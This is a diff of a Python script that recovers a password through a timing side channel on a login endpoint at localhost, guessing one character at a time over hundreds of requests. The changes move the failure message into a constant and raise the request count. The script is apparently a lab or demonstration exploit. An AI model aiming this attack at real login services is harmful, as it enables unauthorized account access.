@@ -10,17 +10,18 @@
 import time
 import requests
 import string
-import re
 import sys
 
 USERNAME = 'test'
 URL = 'http://localhost:3000/login'
 #CHARSET = string.ascii_lowercase
 CHARSET = 'abcde'
-#SUCCESSFULLOGINREGEX = re.compile()
+
+# Message that comes in the response when the login fails
+FAILLOGINMESSAGE = 'Invalid username/password combination'
 
 # set to be the number of requests to set to the server for every character
-NUMREQUESTS = 100
+NUMREQUESTS = 500
 
 def makerequest(guess):
     '''
@@ -51,7 +52,7 @@ def makerequest(guess):
             end = time.time()
 
             # if the response doesn't contain the following string, you successfully logged in and now have the password
-            if "Invalid username/password combination" not in r.text:
+            if FAILLOGINMESSAGE not in r.text:
                 print "Successfully logged in! Username: " + USERNAME + " Password: " + newguess
                 sys.exit()
             #print "response is: " + r.text
